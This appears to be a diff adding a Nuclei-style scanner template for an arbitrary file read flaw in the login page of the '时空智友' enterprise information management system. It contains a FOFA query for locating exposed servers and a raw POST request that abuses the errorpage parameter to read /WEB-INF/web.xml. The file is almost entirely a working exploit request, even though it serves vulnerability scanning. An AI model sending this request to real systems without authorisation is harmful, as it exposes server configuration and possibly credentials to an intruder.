@@ -1,0 +1,35 @@
+id: ShiKongZhiYou-login-ReadFile
+
+info:
+  name: 时空智友企业信息管理系统-login-任意文件读取漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: body="时空智友企业信息管理"
+  tags: ReadFile
+
+http:
+  - raw:
+      - |-
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.4) Gecko/20100503 Firefox/3.6.4 (.NET CLR 3.5.30729)
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/web.xml
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - artery
+      - type: status
+        status:
+          - 200
